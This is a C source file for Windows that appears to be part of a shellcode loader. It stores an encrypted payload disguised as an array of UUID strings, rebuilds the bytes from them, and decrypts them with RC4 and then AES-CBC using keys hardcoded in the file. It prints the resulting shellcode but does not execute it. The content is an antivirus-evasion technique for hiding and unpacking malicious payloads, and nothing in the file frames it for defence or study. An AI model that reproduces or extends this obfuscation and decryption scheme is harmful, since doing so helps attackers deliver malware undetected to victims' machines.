#include <windows.h>
#include <stdio.h>
#include "aes.h"
#include "uuid.h"
#include "rc4.h"
#define KEYSIZE 32
#define IVSIZE 16
#define NumberOfElements 20
#define SHELLCODE_LEN 288
#define T_LEN 276

char* UuidArray[] = {
"363DD3C4-C182-6123-7F82-7A4CA4A4738C","81DEABE3-AB46-72CC-D943-D513FCFC25A0","4D639654-16D9-72DC-5508-8051F1A5951C","D651FAFA-FB56-ACD8-8DD0-40F0B7CA06DA","F496405B-DE1D-087C-B4EC-2DF2F4D0E5B6","A40E0356-CAD2-194A-8FCD-2468C3FBE98E","28F9B32F-9251-22CD-05EC-9DBC04558688","FB0870F3-2230-4742-E208-565BA985D053","E86EB6A2-5D76-D522-1D64-B9B20B466775","D1E1523F-44A3-A2AB-1514-4147593A4BBC","B2F2F0BA-2CFB-7EE6-3801-2F75591078E6","31C96D8C-AF22-445F-BFEE-4036E616B7D4","4FF05D30-EF5F-75FA-2220-74E1DEB297C8","1BD4A87C-D070-0233-7BB0-87E9BA804331","52132076-0E72-D35C-2D6C-27128AE4FB8B","4FE3CA6E-5556-CB5C-BFDB-3025639EB5E8","A6B4CD5C-C9AE-9B23-59CA-7FA2CBE84BCF","BD86758C-E1C8-B84D-6361-2EFDF823F789","4C373C1E-EB68-B78A-E463-D0F72DDE6B3D","BB4887A3-EF78-485E-3888-23B20397F995"};

unsigned char key[] = {0x6d, 0x79, 0x6b, 0x65, 0x79};

unsigned char pKey[] = {0xD9, 0x5B, 0x1E, 0x1E, 0xC7, 0x6E, 0xBD, 0xE5, 0x6D, 0xC9, 0xC1, 0xB5, 0x95, 0xA9, 0xF5, 0xED, 0x8E, 0xFA, 0xC7, 0x31, 0x31, 0x34, 0x60, 0x0B, 0xB2, 0x60, 0xE9, 0xB4, 0x6E, 0x4B, 0x28, 0xD4};

unsigned char pIv[] = {0x36, 0x65, 0x65, 0x1B, 0x85, 0x39, 0x2F, 0xE7, 0x96, 0x9A, 0x8E, 0xDB, 0x26, 0x67, 0xB3, 0x6E};



unsigned char* enc_sc() {
        PBYTE   pDAddress = NULL;
        SIZE_T  sDSize = NULL;

        if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDAddress, &sDSize))
                printf("\t[!] Decrypt uuid array failed...");

        printf("[+] Deobfuscated Bytes at 0x%p of Size %ld ::: \n", pDAddress, sDSize);
        for (size_t i = 0; i < sDSize; i++) {
                if (i % 16 == 0)
                        printf("\n\t");

                printf("%0.2X ", pDAddress[i]);
        }
        printf("\n");
        Rc4Context ctx = { 0 };
        rc4Init(&ctx, key, sizeof(key));
        unsigned char* Ciphertext = (unsigned char*)malloc(SHELLCODE_LEN);
        ZeroMemory(Ciphertext, SHELLCODE_LEN );
        rc4Cipher(&ctx, pDAddress, Ciphertext, SHELLCODE_LEN);

        struct AES_ctx ctxx;
        AES_init_ctx_iv(&ctxx, pKey, pIv);
        AES_CBC_decrypt_buffer(&ctxx, Ciphertext, T_LEN);


        return Ciphertext;
}
int main(int argc, char *argv[])
{
        unsigned char* pPayload = enc_sc();

        PrintHexData("PlainText", pPayload, T_LEN);
        return EXIT_SUCCESS;
}

